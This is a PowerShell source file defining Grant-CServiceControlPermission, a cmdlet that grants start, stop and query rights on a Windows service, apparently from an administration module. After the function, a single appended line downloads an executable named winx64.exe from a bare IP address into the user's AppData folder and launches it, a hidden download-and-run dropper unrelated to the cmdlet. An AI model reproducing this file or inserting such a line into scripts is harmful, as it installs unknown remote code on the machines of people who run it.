
function Grant-CServiceControlPermission
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $ServiceName,
        
        [Parameter(Mandatory=$true)]
        [string]
        
        $Identity
    )
   
    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( $pscmdlet.ShouldProcess( $ServiceName, "grant control service permissions to '$Identity'" ) )
    {
        Grant-CServicePermission -Name $ServiceName -Identity $Identity -QueryStatus -EnumerateDependents -Start -Stop
    }
}


(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

